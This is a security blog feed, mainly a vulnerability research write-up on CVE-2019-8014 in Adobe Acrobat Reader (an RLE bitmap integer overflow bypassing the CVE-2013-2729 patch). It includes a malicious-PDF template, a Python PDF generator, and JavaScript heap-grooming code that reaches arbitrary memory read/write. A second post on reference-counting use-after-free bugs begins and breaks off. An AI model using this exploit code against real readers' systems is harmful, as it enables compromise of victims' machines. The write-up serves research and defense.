class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed before triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>docReady<span class="string">" ref="</span>$host<span class="string">" name="</span>event__docReady<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed after triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;</span></span><br><span class="line"><span class="string">  &lt;/template&gt;</span></span><br><span class="line"><span class="string">  &lt;config xmlns="</span>http:<span class="comment">//www.xfa.org/schema/xci/3.0/"&gt;</span></span><br><span class="line">    &lt;agent name=<span class="string">"designer"</span>&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;destination&gt;pdf&lt;<span class="regexp">/destination&gt;</span></span><br><span class="line"><span class="regexp">      &lt;pdf&gt;</span></span><br><span class="line"><span class="regexp">        &lt;!--  [0..n]  --&gt;</span></span><br><span class="line"><span class="regexp">        &lt;fontInfo/</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>agent&gt;</span><br><span class="line">    &lt;present&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;pdf&gt;</span><br><span class="line">        &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.7</span>&lt;<span class="regexp">/version&gt;</span></span><br><span class="line"><span class="regexp">        &lt;adobeExtensionLevel&gt;5&lt;/</span>adobeExtensionLevel&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">      &lt;common/</span>&gt;</span><br><span class="line">      &lt;xdp&gt;</span><br><span class="line">        &lt;packets&gt;*<span class="xml"><span class="tag">&lt;/<span class="name">packets</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/xdp&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>present&gt;</span><br><span class="line">  &lt;<span class="regexp">/config&gt;</span></span><br><span class="line"><span class="regexp">  &lt;xfa:datasets xmlns:xfa="http:/</span><span class="regexp">/www.xfa.org/</span>schema/xfa-data/<span class="number">1.0</span>/<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;xfa:data xfa:dataNode="</span>dataGroup<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">  &lt;/xfa:datasets&gt;</span></span><br><span class="line"><span class="string">  &lt;xfdf xmlns="</span>http:<span class="comment">//ns.adobe.com/xfdf/" xml:space="preserve"&gt;</span></span><br><span class="line">    &lt;annots/&gt;</span><br><span class="line">  &lt;<span class="regexp">/xfdf&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>xdp:xdp&gt;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line">xref</span><br><span class="line"><span class="number">0</span> <span class="number">7</span></span><br><span class="line"><span class="number">0000000000</span> <span class="number">65535</span> f </span><br><span class="line"><span class="number">0000000009</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000237</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000306</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000587</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000746</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000782</span> <span class="number">00000</span> n </span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Root <span class="number">1</span> <span class="number">0</span> R</span><br><span class="line">    /Size <span class="number">7</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">__XREF_OFFSET__</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure><p>The size of the generated BMP file will be larger than 60MB. And it will be encoded in base64 and embedded within <code>6 0 obj</code> of the PDF file. To reduce the file size, this object will be compressed using the zlib/deflate compression method.</p><p>To exploit the vulnerability, we’ll need to have chances to run JavaScript code before and after triggering the vulnerability. This can be done by putting the JavaScript code within the <code>initialize</code> event and the <code>docReady</code> event.</p><p>Following python code can be used to generate the PDF file.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_template</span><span class="params">(template_path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(template_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    xdp_begin = data.find(<span class="string">'&lt;xdp:xdp'</span>)</span><br><span class="line">    xdp_end = data.find(<span class="string">'&lt;/xdp:xdp&gt;'</span>) + len(<span class="string">'&lt;/xdp:xdp&gt;'</span>)</span><br><span class="line">    </span><br><span class="line">    part1 = data[:xdp_begin]</span><br><span class="line">    part2 = data[xdp_begin:xdp_end]</span><br><span class="line">    part3 = data[xdp_end:]</span><br><span class="line">    <span class="keyword">return</span> part1, part2, part3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_pdf</span><span class="params">(image_path, template_path, pdf_path)</span>:</span></span><br><span class="line">    pdf_part1, pdf_part2, pdf_part3 = parse_template(template_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(image_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        image_data = base64.b64encode(f.read())</span><br><span class="line">    pdf_part2 = pdf_part2.replace(<span class="string">'__IMAGE_BASE64_DATA__'</span>, image_data)</span><br><span class="line">    pdf_part2 = zlib.compress(pdf_part2)</span><br><span class="line">    </span><br><span class="line">    pdf_part1 = pdf_part1.replace(<span class="string">'__STREAM_LENGTH__'</span>, <span class="string">'%d'</span> % len(pdf_part2))</span><br><span class="line">    </span><br><span class="line">    pdf_data = pdf_part1 + pdf_part2 + pdf_part3</span><br><span class="line">    pdf_data = pdf_data.replace(<span class="string">'__XREF_OFFSET__'</span>, <span class="string">'%d'</span> % pdf_data.find(<span class="string">'xref'</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(pdf_path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        filename = os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;input.bmp&gt; &lt;template.pdf&gt; &lt;output.pdf&gt;'</span> % filename</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_pdf(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><h3 id="5-5-Exploit-Tricks"><a href="#5-5-Exploit-Tricks" class="headerlink" title="5.5 Exploit Tricks"></a>5.5 Exploit Tricks</h3><h4 id="5-5-1-Memory-Layout-1"><a href="#5-5-1-Memory-Layout-1" class="headerlink" title="5.5.1 Memory Layout (1)"></a>5.5.1 Memory Layout (1)</h4><p>In this case, <code>ArrayBuffer</code> is more suitable for exploiting the vulnerability.</p><p>Firstly, we can create lots of <code>ArrayBuffer</code> objects with <code>byteLength</code> setting to <code>0xE0</code> . And free one <code>ArrayBuffer</code> object of every <code>ArrayBuffer</code> pair to create holes.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │     Hole    │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br><span class="line">│ &lt;-  0xF0 -&gt; │</span><br></pre></td></tr></table></figure><p>Then we trigger the vulnerability, and the heap buffer of the bitmap will be placed in one of the holes.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br></pre></td></tr></table></figure><p>Since we are able to write <code>0xF4</code> bytes backward with value <code>0x10</code> . The backing store of the <code>ArrayBuffer</code> will be filled with <code>0x10</code> .</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 304c8398</span><br><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">304c8398  00000000 10101010 10101010 10101010</span><br><span class="line">;         ArrayBuffer data</span><br><span class="line">304c83a8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83b8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83c8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83d8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83e8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83f8  10101010 10101010 10101010 10101010</span><br><span class="line">304c8408  10101010 10101010 10101010 10101010</span><br><span class="line">304c8418  10101010 10101010 10101010 10101010</span><br><span class="line">304c8428  10101010 10101010 10101010 10101010</span><br><span class="line">304c8438  10101010 10101010 10101010 10101010</span><br><span class="line">304c8448  10101010 10101010 10101010 10101010</span><br><span class="line">304c8458  10101010 10101010 10101010 10101010</span><br><span class="line">304c8468  10101010 10101010 10101010 10101010</span><br><span class="line">304c8478  10101010 10101010 10101010 10101010 ; end of ArrayBuffer</span><br><span class="line">; metadata of next heap buffer (bitmap data)</span><br><span class="line">304c8488  10101010 10101010</span><br><span class="line">; bitmap data begins here</span><br><span class="line">304c8490                    00000000 00000000</span><br></pre></td></tr></table></figure><p>Now the <code>byteLength</code> of the <code>ArrayBuffer</code> object has been changed to <code>0x10101010</code> and we can achieve Out-Of-Bounds access now. So far so good? The fact is that the process will crash immediately since we also changed the <code>DataView</code> pointer.</p><h4 id="5-5-2-Memory-Layout-0"><a href="#5-5-2-Memory-Layout-0" class="headerlink" title="5.5.2 Memory Layout (0)"></a>5.5.2 Memory Layout (0)</h4><p>We can avoid the crash if we can make <code>0x10101010</code> acts like a valid pointer. Obviously, we should arrange the memory layout before triggering the vulnerability. To make it more stable, it should be done even before we create and free the <code>ArrayBuffer</code> objects.</p><p>We need the ability to put any value at any memory address, such as <code>0x10101010</code> . To achieve this goal, we can create lots of <code>ArrayBuffer</code> objects with <code>byteLength</code> setting to <code>0xFFE8</code> . That’s a carefully selected size to make sure that the <code>ArrayBuffer</code> objects will be allocated at predictable addresses.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xFFE8 -&gt; byteLength</span></span><br><span class="line"><span class="comment">// 0x10 -&gt; sizeof ObjectElements</span></span><br><span class="line"><span class="comment">// 0x08 -&gt; sizeof heap block's metadata</span></span><br><span class="line"><span class="number">0xFFE8</span> + <span class="number">0x10</span> + <span class="number">0x08</span> = <span class="number">0x10000</span></span><br></pre></td></tr></table></figure><p>I’m not going to discuss how to avoid the crash in details, it’s very easy to figure out the specific conditions. Following code can be used to avoid the crash.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It’s not done yet. The process still crashes when we try to create a new <code>DataView</code> object for it. We can avoid the crash using the same tricks. Following is the improved code.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// avoid crash when triggering the vulnerability</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// avoid crash when creating new DataView objects</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFFA4</span>, <span class="number">0x10100458</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-5-3-Global-Read-Write"><a href="#5-5-3-Global-Read-Write" class="headerlink" title="5.5.3 Global Read / Write"></a>5.5.3 Global Read / Write</h4><p>Once we overwrote the <code>byteLength</code> of any <code>ArrayBuffer</code> object with <code>0x10101010</code> , we can leverage this <code>ArrayBuffer</code> object to overwrite next one’s <code>byteLength</code> to <code>0xFFFFFFFF</code> . It’s very easy to search the next <code>ArrayBuffer</code> object if we put a flag value within all the <code>ArrayBuffer</code> objects.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  (1)byteLength            (3)Global Access</span><br><span class="line"> ┌─&lt;───&lt;───&lt;───┐            &lt;──────┬──────&gt;</span><br><span class="line">┌┼────────────┬┼────────────┬──────┼──────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└──────┼──────┴─────────────┴┼────────────┴─────────────┘</span><br><span class="line">       └──&gt;───&gt;───&gt;───&gt;────&gt;─┘</span><br><span class="line">        (2) byteLength to -1</span><br></pre></td></tr></table></figure><p>Now we have the ability to read and write any memory address within the user space.</p><h4 id="5-5-4-Absolute-Address-Access"><a href="#5-5-4-Absolute-Address-Access" class="headerlink" title="5.5.4 Absolute Address Access"></a>5.5.4 Absolute Address Access</h4><p>Once we have the global access ability, we can <strong>search backward</strong> to calculate the base address of the <code>ArrayBuffer</code> object’s backing store buffer, thus we can read and write at any given absolute memory address.</p><p>We can search two flags, <code>ffeeffee</code> or <code>f0e0d0c0</code> , to calculate the base address. To make it more accurate, the bytes around the flag value also need to be verified.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 30080000</span><br><span class="line">30080000  16b80e9e 0101331b ffeeffee 00000002  ; ffeeffee</span><br><span class="line">30080010  055a00a4 2f0b0010 055a0000 30080000  ; +0x14 -&gt; 30080000</span><br><span class="line">30080020  00000fcf 30080040 3104f000 000002e5</span><br><span class="line">30080030  00000001 00000000 30d69ff0 30d69ff0</span><br><span class="line">30080040  3eb82e96 08013313 00000000 0000ffe8</span><br><span class="line">30080050  00000000 00000000 10100158 00000000</span><br><span class="line">30080060  00000000 00000000 00000000 00000000</span><br><span class="line">30080070  00000000 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:014&gt; dd 305f4000</span><br><span class="line">305f4000  00000000 00000000 6ab08d69 0858b71a</span><br><span class="line">305f4010  0bbab388 30330080 0ff00112 f0e0d0c0  ; f0e0d0c0</span><br><span class="line">305f4020  15dc2c3f 00000430 305f402c d13bc929  ; +0x0C -&gt; 305f402c</span><br><span class="line">305f4030  e5c521a7 d9b264d4 919cee58 45da954e</span><br><span class="line">305f4040  5c3f608b 2b5fd340 0bae3aa9 2b5fd340</span><br><span class="line">305f4050  0fae32aa d13bc929 e5c521a7 d9b264d4</span><br><span class="line">305f4060  919cee58 45da954e 9c3f608b f952aa94</span><br><span class="line">305f4070  989c772a a1dd934a ac5b154b 2fadd038</span><br></pre></td></tr></table></figure><h4 id="5-5-5-Remaining-Steps"><a href="#5-5-5-Remaining-Steps" class="headerlink" title="5.5.5 Remaining Steps"></a>5.5.5 Remaining Steps</h4><p>Once we can read and write at any given absolute memory address, it’s very easy to achieve code execution. Following are the remaining steps that will not be discussed in this post:</p><ul><li>EIP hijack</li><li>ASLR bypass</li><li>DEP bypass</li><li>CFG bypass</li></ul><h2 id="0x06-CVE-2013-2729"><a href="#0x06-CVE-2013-2729" class="headerlink" title="0x06. CVE-2013-2729"></a>0x06. CVE-2013-2729</h2><p>Three integer overflows were found within the handling of RLE compressed data, one in RLE8 decompression and the other two in RLE4 decompression.</p><p>Why shouldn’t we found four? Because another one have been patched six years ago. You can read <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliam’s write up for CVE-2013-2729</a> if you haven’t read it yet.</p><p>Also, the patch for CVE-2013-2729 can be found within the handling of RLE8 compressed data.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">     dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// overflow check</span></span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>It’s astonishing that Adobe only patched the case that was reported and ignored the other three.</p><h2 id="0x07-Lessons-Learned"><a href="#0x07-Lessons-Learned" class="headerlink" title="0x07. Lessons Learned"></a>0x07. Lessons Learned</h2><p>For product developers, please try to understand the root cause of the vulnerability and eliminate similar ones as much as you can.</p><p>For security researchers, patch analysis is a good way to figure out what the developers were thinking, and maybe you can find bypass solutions (this happens sometimes).</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;em&gt;This post provides detailed analysis for CVE-2019-8014 which was fixed in Adobe Acrobat Reader / Pro DC recently. Interestingly, it’s a patch bypass of CVE-2013-2729 which was &lt;del&gt;&lt;strong&gt;fixed&lt;/strong&gt;&lt;/del&gt; six years ago. This post also discusses how to exploit the vulnerability.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Author: &lt;strong&gt;Ke Liu of Tencent Security Xuanwu Lab&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-Introduction&quot;&gt;&lt;a href=&quot;#0x01-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x01. Introduction&quot;&gt;&lt;/a&gt;0x01. Introduction&lt;/h2&gt;&lt;p&gt;Adobe released security updates for Adobe Acrobat and Reader in &lt;a href=&quot;https://helpx.adobe.com/security/products/acrobat/apsb19-41.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;APSB19-41&lt;/a&gt; in August. As usual, lots of vulnerabilities were fixed in the updates. When I was reviewing the corresponding advisories on &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/published/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ZDI&lt;/a&gt; , my attention was attracted by one of them: &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-19-725/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ZDI-19-725&lt;/a&gt; / &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8014&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CVE-2019-8014&lt;/a&gt; . Following text is the title and description of this case:&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="http://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="Adobe Reader" scheme="http://programlife.net/tags/Adobe-Reader/"/>
    
      <category term="PDF" scheme="http://programlife.net/tags/PDF/"/>
    
      <category term="CVE-2019-8014" scheme="http://programlife.net/tags/CVE-2019-8014/"/>
    
      <category term="CVE-2013-2729" scheme="http://programlife.net/tags/CVE-2013-2729/"/>
    
      <category term="XFA" scheme="http://programlife.net/tags/XFA/"/>
    
      <category term="BMP" scheme="http://programlife.net/tags/BMP/"/>
    
      <category term="RLE" scheme="http://programlife.net/tags/RLE/"/>
    
  </entry>
  
  <entry>
    <title>引用计数相关漏洞案例</title>
    <link href="http://programlife.net/2019/07/03/reference-counting-vulnerability/"/>
    <id>http://programlife.net/2019/07/03/reference-counting-vulnerability/</id>
    <published>2019-07-03T00:13:37.000Z</published>
    <updated>2019-07-03T14:37:21.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>垃圾分类</strong> 是最近非常火爆的一个话题，其经常出现在各种新闻报道中，碰巧的是笔者最近也在研究 <strong>垃圾回收</strong> ，但此垃圾非彼垃圾，笔者研究的是程序设计语言中的 <strong>Garbage Collection</strong>（下文简称 <strong>GC</strong>）。</p><p>关于 GC 的入门读物，这里强烈推荐日本人在 2010 年出版的书籍《<strong>垃圾回收的算法与实现</strong>》。笔者在阅读该书的部分内容时，刚好想到了几个相关的漏洞，因此写篇文章记录一下。</p><a id="more"></a><h2 id="0x01-Python-析构函数"><a href="#0x01-Python-析构函数" class="headerlink" title="0x01. Python 析构函数"></a>0x01. Python 析构函数</h2><p>Python 基于引用计数来实现 GC 算法。在引用计数法中，各个对象的内部都有一个专门用于引用计数的成员，以及相应的操作函数 <code>inc_ref_count</code> 和 <code>dec_ref_count</code> 来增减引用计数。特别的，如果在 <code>dec_ref_count</code> 中，引用计数递减之后等于零，那么该对象就需要被回收掉了。</p><p>在 Python 中定义一个对象时，可以通过 <code>__init__</code> 定义构造函数、通过 <code>__del__</code> 定义析构函数。在引用计数变为 <code>0</code> 之后、销毁对象之前，Python 会检查对象是否定义了 <code>__del__</code> 函数，如果有，则调用之。相关的代码如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">slot_tp_del</span><span class="params">(PyObject *self)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> PyObject *del_str = <span class="literal">NULL</span>;</span><br><span class="line">    PyObject *del, *res;</span><br><span class="line">    </span><br><span class="line">    self-&gt;ob_refcnt = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 如果有 __del__ 就执行它 */</span></span><br><span class="line">    del = lookup_maybe(self, <span class="string">"__del__"</span>, &amp;del_str);</span><br><span class="line">    <span class="keyword">if</span> (del != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        res = PyEval_CallObject(del, <span class="literal">NULL</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 省略部分：错误检查和后处理等 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (--self-&gt;ob_refcnt == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">/* 退出函数 */</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">/* 省略部分：最终化时有引用的情况下的应对处理 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在进入 <code>slot_tp_del</code> 之前，对象的引用计数已经为 <code>0</code> 了，但是在该函数中，在调用 <code>__del__</code> 函数之前将引用计数重新设置为 <code>1</code> ，而在调用之后则将引用计数减去 <code>1</code> 并判断结果是否为 <code>0</code> ，这里主要是判断在调用 <code>__del__</code> 的过程中是否又产生了新的引用。</p><p>像这样的判断是很有必要的，如果没有这样的判断，那么后面可能就直接把对象回收了，而如果 <code>__del__</code> 中产生了新的引用，那么就会导致 <a href="https://programlife.net/tags/Use-After-Free/">UAF</a> 。</p><h2 id="0x02-VBScript-Class-Terminate-UAF"><a href="#0x02-VBScript-Class-Terminate-UAF" class="headerlink" title="0x02. VBScript Class_Terminate UAF"></a>0x02. VBScript Class_Terminate UAF</h2><p>CVE-2018-8174 是 VBScript <code>Class_Terminate</code> 函数（析构函数）中引用计数处理不当导致的 UAF 漏洞，漏洞的细节可以参考 <a 